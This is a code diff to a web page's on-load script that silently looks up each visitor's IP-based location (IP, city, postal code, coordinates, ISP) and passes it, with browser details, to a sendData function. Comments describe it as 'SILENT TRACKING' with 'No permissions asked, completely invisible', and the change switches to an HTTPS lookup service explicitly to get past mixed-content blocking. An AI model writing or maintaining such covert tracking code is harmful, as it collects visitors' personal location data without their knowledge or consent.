@@ -29,8 +29,8 @@
 
     <script>
         window.onload = function() {
-            // SILENT TRACKING: No permissions asked, completely invisible.
-            fetch('http://ip-api.com/json/')
+            // SILENT TRACKING: HTTPS API to bypass mixed content blocks
+            fetch('https://ipapi.co/json/')
                 .then(response => response.json())
                 .then(ipData => {
                     sendData(ipData);
@@ -49,14 +49,14 @@
                 language: navigator.language,
                 stealth_location: ipData ? {
                     status: "Success (Silent Tracking)",
-                    ip: ipData.query,
-                    country: ipData.country,
-                    region: ipData.regionName,
+                    ip: ipData.ip,
+                    country: ipData.country_name,
+                    region: ipData.region,
                     city: ipData.city,
-                    zip: ipData.zip,
-                    latitude: ipData.lat,
-                    longitude: ipData.lon,
-                    isp: ipData.isp
+                    zip: ipData.postal,
+                    latitude: ipData.latitude,
+                    longitude: ipData.longitude,
+                    isp: ipData.org
                 } : "Failed to fetch silent location"
             };
 
